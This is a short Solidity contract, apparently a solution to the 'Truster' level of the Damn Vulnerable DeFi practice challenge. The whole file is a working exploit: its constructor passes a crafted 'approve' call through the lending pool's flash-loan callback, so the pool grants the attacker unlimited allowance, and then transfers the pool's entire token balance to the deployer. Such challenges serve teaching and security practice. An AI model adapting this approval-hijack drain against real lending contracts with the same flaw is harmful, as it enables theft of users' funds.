// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttack {
    constructor(TrusterLenderPool pool) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        IERC20 token = pool.damnValuableToken();
        pool.flashLoan(0, msg.sender, address(token), data);
        uint256 balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), msg.sender, balance);
    }
}
